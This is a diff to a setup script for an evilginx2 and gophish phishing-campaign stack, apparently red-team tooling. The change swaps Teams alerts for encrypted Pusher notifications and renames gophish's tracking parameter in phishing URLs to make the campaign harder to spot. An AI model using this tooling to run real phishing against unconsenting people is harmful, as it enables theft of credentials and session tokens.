@@ -29,14 +29,14 @@ function print_info () {
 if [[ $# -ne 8 ]]; then
     print_error "Missing Parameters:"
     print_error "Usage:"
-    print_error './setup <root domain> <evilginx2 subdomain(s)> <evilginx2 root domain bool> <gophish subdomain(s)> <gophish root domain bool> <redirect url> <Teams messages bool> <rid replacement>'
+    print_error './setup <root domain> <evilginx2 subdomain(s)> <evilginx2 root domain bool> <gophish subdomain(s)> <gophish root domain bool> <redirect url> <Pusher messages bool> <rid replacement>'
     print_error " - root domain                     - the root domain to be used for the campaign"
     print_error " - evilginx2 subdomains            - a space separated list of evilginx2 subdomains, can be one if only one"
     print_error " - evilginx2 root domain bool      - true or false to proxy root domain to evilginx2"
     print_error " - gophish subdomains              - a space separated list of gophish subdomains, can be one if only one"
     print_error " - gophish root domain bool        - true or false to proxy root domain to gophish"
     print_error " - redirect url                    - URL to redirect unauthorized Apache requests"
-    print_error " - Teams messages bool             - true or false to setup Microsoft Teams messages"
+    print_error " - Pusher messages bool            - true or false to setup Pusher messages to an encrypted channel"
     print_error " - rid replacement                 - replace the gophish default \"rid\" in phishing URLs with this value"
     print_error "Example:"
     print_error '  ./setup.sh example.com login false "download www" false https://redirect.com/ true user_id'
@@ -51,7 +51,7 @@ e_root_bool="${3}"
 gophish_subs="${4}"
 g_root_bool="${5}"
 redirect_url="${6}"
-teams_bool="${7}"
+pusher_bool="${7}"
 rid_replacement="${8}"
 evilginx_dir=$HOME/.evilginx
 
@@ -70,7 +70,7 @@ function get_certs_path () {
 function install_depends () {
     print_info "Installing dependencies with apt"
     apt-get update
-    apt-get install apache2 build-essential letsencrypt wget git net-tools tmux -y > /dev/null
+    apt-get install apache2 build-essential letsencrypt wget git net-tools tmux openssl -y > /dev/null
     print_good "Installed dependencies with apt!"
     print_info "Installing Go from source"
     wget https://go.dev/dl/go1.19.linux-amd64.tar.gz > /dev/null
@@ -167,10 +167,39 @@ function setup_gophish () {
     print_info "Configuring gophish"
     sed "s|\"cert_path\": \"gophish_template.crt\",|\"cert_path\": \"${certs_path}fullchain.pem\",|g" config.json.template > gophish/config.json
     sed -i "s|\"key_path\": \"gophish_template.key\"|\"key_path\": \"${certs_path}privkey.pem\"|g" gophish/config.json
-    if [[ $(echo "${teams_bool}" | grep -ci "true") -gt 0 ]]; then
-        print_info "Enter Microsoft Teams Webhook URL:"
-        read -r webhook_url
-        sed -i "s|\"teams_webhook_url\": \"\"|\"teams_webhook_url\": \"${webhook_url}\"|g" gophish/config.json
+    # Setup Pusher if selected
+    if [[ $(echo "${pusher_bool}" | grep -ci "true") -gt 0 ]]; then
+        print_info "Enter Pusher channel \"app_id\":"
+        read -r app_id
+        print_info "Enter Pusher channel \"key\":"
+        read -r key
+        print_info "Enter Pusher channel \"secret\":"
+        read -r secret
+        print_info "Enter Pusher channel \"cluster\":"
+        read -r cluster
+        print_info "Enter Pusher channel encryption key (generated with: openssl rand -base64 32):"
+        read -r encrypt_key
+        print_info "Enter Pusher channel name:"
+        read -r channel_name
+        sed -i "s|\"pusher_app_id\": \"\",|\"pusher_app_id\": \"${app_id}\",|g" gophish/config.json
+        sed -i "s|\"pusher_app_key\": \"\",|\"pusher_app_key\": \"${key}\",|g" gophish/config.json
+        sed -i "s|\"pusher_app_secret\": \"\",|\"pusher_app_secret\": \"${secret}\",|g" gophish/config.json
+        sed -i "s|\"pusher_app_cluster\": \"\",|\"pusher_app_cluster\": \"${cluster}\",|g" gophish/config.json
+        sed -i "s|\"pusher_encrypt_key\": \"\",|\"pusher_encrypt_key\": \"${encrypt_key}\",|g" gophish/config.json
+        sed -i "s|\"pusher_channel_name\": \"\",|\"pusher_channel_name\": \"${channel_name}\",|g" gophish/config.json
+        sed -i "s|\"enable_pusher\": false,|\"enable_pusher\": true,|g" gophish/config.json
+        sed -i "s|PUSHER_APP_ID=\"\"|PUSHER_APP_ID=\"${app_id}\"|g" pusher/.env
+        sed -i "s|PUSHER_APP_KEY=\"\"|PUSHER_APP_KEY=\"${key}\"|g" pusher/.env
+        sed -i "s|PUSHER_APP_SECRET=\"\"|PUSHER_APP_SECRET=\"${secret}\"|g" pusher/.env
+        sed -i "s|PUSHER_APP_CLUSTER=\"\"|PUSHER_APP_CLUSTER=\"${cluster}\"|g" pusher/.env
+        sed -i "s|PUSHER_CHANNELS_ENCRYPTION_KEY=\"\"|PUSHER_CHANNELS_ENCRYPTION_KEY=\"${encrypt_key}\"|g" pusher/.env
+        sed -i "s|const APP_KEY = '';|const APP_KEY = '${key}';|g" pusher/client/app.js
+        sed -i "s|const APP_CLUSTER = '';|const APP_CLUSTER = '${cluster}';|g" pusher/client/app.js
+        sed -i "s|const channel = pusher.subscribe('');|const channel = pusher.subscribe('${channel_name}');|g" pusher/client/app.js
+        cd pusher || exit 1
+        go build
+        cd ..
+        print_good "Pusher configured! cd into pusher then launch binary with ./pusher to start!"
     fi
     # Replace rid with user input
     find . -type f -exec sed -i "s|client_id|${rid_replacement}|g" {} \;
